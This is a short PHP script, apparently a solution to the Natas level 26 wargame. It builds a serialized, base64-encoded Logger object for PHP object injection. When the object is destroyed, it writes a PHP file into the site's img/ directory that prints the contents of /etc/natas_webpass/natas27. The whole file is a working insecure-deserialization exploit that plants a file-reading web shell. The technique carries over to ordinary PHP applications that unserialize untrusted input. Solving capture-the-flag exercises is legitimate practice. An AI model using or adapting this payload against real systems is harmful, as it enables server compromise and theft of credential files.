<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
   
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/natas26_yinesiktim.php";
   
        // write initial message
        $fd=fopen($this->logFile,"w+");
        fwrite($fd,$this->initMsg);
        fclose($fd);
    }                       
   
    function log($msg){
        $fd=fopen($this->logFile,"w+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
   
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"w+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}

$log = new Logger("asdf");

echo base64_encode(serialize($log));

?>
